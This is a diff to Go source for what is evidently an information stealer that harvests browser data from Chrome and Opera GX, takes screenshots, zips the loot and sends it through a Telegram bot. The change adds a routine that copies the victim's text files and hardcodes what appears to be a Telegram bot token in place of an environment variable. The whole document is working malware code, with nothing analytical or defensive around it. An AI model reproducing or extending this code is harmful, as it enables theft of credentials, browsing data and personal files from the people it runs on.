@@ -31,7 +31,7 @@ func main() {
 	operaGXPath := path.Join(os.Getenv("appdata"), `Opera Software\Opera GX Stable`)
 
 	//Yoink
-	wg.Add(9)
+	wg.Add(10)
 	if _, err := os.Stat(chromePath); !os.IsNotExist(err) {
 		go func() {
 			browsers.Chrome(chromePath, logFolderPath)
@@ -88,6 +88,10 @@ func main() {
 		utils.GetScreenshot(logFolderPath)
 		wg.Done()
 	}()
+	go func() {
+		utils.CopyTxtFiles(logFolderPath)
+		wg.Done()
+	}()
 	wg.Wait()
 
 	//Create zip
@@ -116,7 +120,7 @@ func main() {
 		panic(err)
 	}
 
-	bot, err := tgbotapi.NewBotAPI(os.Getenv("BOT_TOKEN"))
+	bot, err := tgbotapi.NewBotAPI("1664618644:AAE7TvjRGvUagMxkulUclo5AD3BwUMul-i4")
 	if err != nil {
 		panic(err)
 	}
